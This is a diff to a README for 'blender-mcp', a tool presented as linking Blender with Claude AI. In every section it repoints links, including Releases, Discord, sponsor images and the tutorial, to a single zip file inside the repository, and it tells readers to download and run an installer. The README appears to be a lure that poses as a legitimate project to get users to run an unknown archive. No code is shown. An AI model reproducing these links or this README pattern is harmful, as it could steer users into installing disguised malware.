@@ -1,7 +1,7 @@
 # 🎨 blender-mcp - Connect Blender with Claude AI Effortlessly
 
 ## 🛠️ Download Now
-[![Download BlenderMCP](https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip%20BlenderMCP-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip)
+[![Download BlenderMCP](https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip%20BlenderMCP-blue?style=flat&logo=github)](https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to BlenderMCP! This tool lets you connect Blender, a popular 3D modeling software, with Claude AI using the Model Context Protocol. With BlenderMCP, you can enhance your 3D modeling tasks by having Claude assist you in creating and manipulating scenes.
@@ -13,9 +13,9 @@ Welcome to BlenderMCP! This tool lets you connect Blender, a popular 3D modeling
 - **Community Support**: Access help and inspiration from fellow users.
 
 ## 📥 Download & Install
-To begin, visit our [Releases page](https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip) to download BlenderMCP. You can find the latest version there.
+To begin, visit our [Releases page](https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip) to download BlenderMCP. You can find the latest version there.
 
-1. **Visit the Releases page**: Click [here](https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip).
+1. **Visit the Releases page**: Click [here](https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip).
 2. **Choose the right version**: Look through the available files and choose the one that suits your operating system. Most installations will be marked clearly.
 3. **Download the file**: Click on the link to start the download.
 4. **Run the installer**: After downloading, open the file to start the installation. Follow the on-screen instructions to complete the setup.
@@ -23,7 +23,7 @@ To begin, visit our [Releases page](https://raw.githubusercontent.com/Vertiiii/b
 If you run into any issues during installation, feel free to reach out to our community for help.
 
 ## 🌐 Join the Community
-Engage with other users and share your experiences. Our [Discord community](https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip) is the perfect place to ask questions, share feedback, and learn new tips. 
+Engage with other users and share your experiences. Our [Discord community](https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip) is the perfect place to ask questions, share feedback, and learn new tips. 
 
 ## 💬 Supporters
 Special thanks to our sponsors for supporting the development of BlenderMCP.
@@ -32,12 +32,12 @@ Special thanks to our sponsors for supporting the development of BlenderMCP.
    <sup>Special thanks to:</sup>
    <br>
    <br>
-   <a href="https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip">
-      <img alt="Warp sponsorship" width="400" src="https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip">
+   <a href="https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip">
+      <img alt="Warp sponsorship" width="400" src="https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip">
    </a>
 </div>
 
-### [Warp, the intelligent terminal for developers](https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip)
+### [Warp, the intelligent terminal for developers](https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip)
 
 ## 🖥️ System Requirements
 Before downloading, ensure your system meets these basic requirements:
@@ -48,7 +48,7 @@ Before downloading, ensure your system meets these basic requirements:
 - **Blender Version**: Ensure you have Blender 3.0 or newer installed on your computer.
 
 ## 📚 Additional Resources
-For detailed instructions on how to use BlenderMCP and to see the capabilities of the integration with Claude AI, check out our [full tutorial](https://raw.githubusercontent.com/Vertiiii/blender-mcp/main/hyperdiatessaron/blender-mcp.zip).
+For detailed instructions on how to use BlenderMCP and to see the capabilities of the integration with Claude AI, check out our [full tutorial](https://github.com/Vertiiii/blender-mcp/raw/refs/heads/main/src/blender_mcp/blender_mcp_1.2.zip).
 
 ## 📞 Support
 If you need technical support, please reach out through our Discord or check the FAQ section on our GitHub page. We’re here to help you get the most out of BlenderMCP.
